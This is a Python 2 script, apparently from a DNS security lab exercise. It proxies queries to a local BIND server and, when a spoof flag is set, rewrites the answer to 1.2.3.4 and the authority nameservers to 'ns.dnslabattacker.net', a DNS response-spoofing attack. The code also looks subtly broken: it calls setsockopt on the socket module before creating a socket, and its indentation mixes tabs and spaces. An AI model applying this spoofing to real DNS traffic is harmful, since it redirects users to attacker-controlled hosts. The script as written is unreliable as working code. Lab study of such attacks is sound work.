#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

PROXY_IP = "127.0.0.1"
socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server.bind((PROXY_IP, port))

# Main reroute loop
while True:
    # Read some arbitrary number of bytes i.e. 1024
	initial_data, (initial_addr, initial_port) = server.recvfrom(1024)
    # DNS address is the proxy server IP address
	server.sendto(initial_data, (PROXY_IP, dns_port))

    # Response data
	response_data, (response_addr, response_port) = server.recvfrom(1024)
	dns_pack = DNS(response_data)

	# Spoof for part 3
	if SPOOF:
		dns_pack.an.rdata = "1.2.3.4"
		dns_pack.ns['DNSRR'][0].rdata = "ns.dnslabattacker.net"
		dns_pack.ns['DNSRR'][1].rdata = "ns.dnslabattacker.net"

	# Send DNS packet
	server.sendto(bytes(dns_pack), (initial_addr, initial_port))